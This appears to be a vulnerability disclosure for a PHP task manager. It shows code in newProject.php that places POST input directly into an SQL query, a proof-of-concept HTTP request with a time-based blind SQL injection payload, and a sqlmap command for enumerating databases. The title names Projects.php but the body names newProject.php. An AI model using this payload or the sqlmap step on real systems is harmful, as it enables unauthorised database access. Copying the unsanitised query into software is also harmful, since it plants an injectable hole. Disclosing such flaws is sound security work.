# task-manager-in-php has time-based blind SQL injection vulnerability in Projects.php

## supplier 
https://code-projects.org/task-manager-in-php-with-source-code/
## Vulnerability file
newProject.php

## describe
In newProject.php, 

**Code analysis**    

```

<?php include('databaseConnect.php') ?>

<?php 
	if(isset($_POST['createProject'])){
		//validate and insert into database.
		$sql = "INSERT into project (projectName) VALUES ('".$_POST['projectName']."')";
		if ($conn->query($sql) == TRUE) 
		{
			echo "New record created successfully";
		} 
		
		else 
		{
			echo "Error creating record: " . $conn->error;
			echo "Error: " . $sql . "<br>" . $conn->error;
		}

			
		header("location:Projects.php");
		exit();
	}
 ?>
 
```
Inserting $_POST['projectName'] into Mysql without any filter. A time-based blind SQL injection can be triggered.




## POC

```
POST /newProject.php HTTP/1.1
Host: localhost:8081
Content-Length: 136
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="131", "Not_A Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Origin: http://localhost:8081
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:8081/Projects.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

projectName=faiJ'||(SELECT 0x4778515a WHERE 7548=7548 AND (SELECT 1937 FROM (SELECT(SLEEP(5)))UGzB))||'&priority=tYsE&createProject=yAce
```

Send this request, you can see a 5 sec time delay triggered by the time-based injection

## Exploit

To obtain the dataset name
```
python3 sqlmap.py -u "http://localhost:8080/Projects.php" --forms --dbs
```

use sqlmap to continue your attack.

**Result**

![image-20241126221600209](https://github.com/LamentXU123/cve/blob/main/assest/SQL_injection1.png)
